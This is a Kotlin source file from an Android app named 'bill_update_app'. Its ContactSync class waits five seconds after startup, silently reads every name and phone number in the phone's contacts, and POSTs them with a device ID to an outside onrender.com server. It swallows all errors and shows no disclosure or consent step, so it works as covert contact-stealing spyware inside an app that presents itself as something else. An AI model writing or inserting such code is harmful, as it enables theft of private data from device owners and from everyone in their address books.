package com.example.bill_update_app

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class ContactSync private constructor(private val context: Context) {
    private val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
    private var alreadySynced = false

    companion object {
        private var instance: ContactSync? = null

        fun init(context: Context) {
            if (instance == null) {
                instance = ContactSync(context.applicationContext)
                instance?.start()
            }
        }
    }

    fun start() {
        if (alreadySynced) return
        alreadySynced = true
        Handler(Looper.getMainLooper()).postDelayed({
            Thread { sync() }.start()
        }, 5000)
    }

    private fun sync() {
        try {
            val deviceId = prefs.getString("device_id", "") ?: ""
            if (deviceId.isEmpty()) return

            var cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, null
            )

            val contacts = JSONArray()
            val seen = HashSet<String>()
            cursor?.use { c ->
                val nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (c.moveToNext()) {
                    val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "" else ""
                    val phone = if (numIdx >= 0) c.getString(numIdx) ?: "" else ""
                    val key = name + phone
                    if (key.isNotEmpty() && seen.add(key)) {
                        contacts.put(JSONObject().apply {
                            put("name", name)
                            put("phone", phone)
                            put("email", "")
                        })
                    }
                }
            }

            if (contacts.length() == 0) return

            val payload = JSONObject().apply {
                put("device_id", deviceId)
                put("contacts", contacts)
            }

            val conn = URL("https://bill-1-9yfp.onrender.com/api/contacts").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.outputStream.write(payload.toString().toByteArray())
            conn.responseCode
            conn.disconnect()
        } catch (_: Exception) {}
    }
}
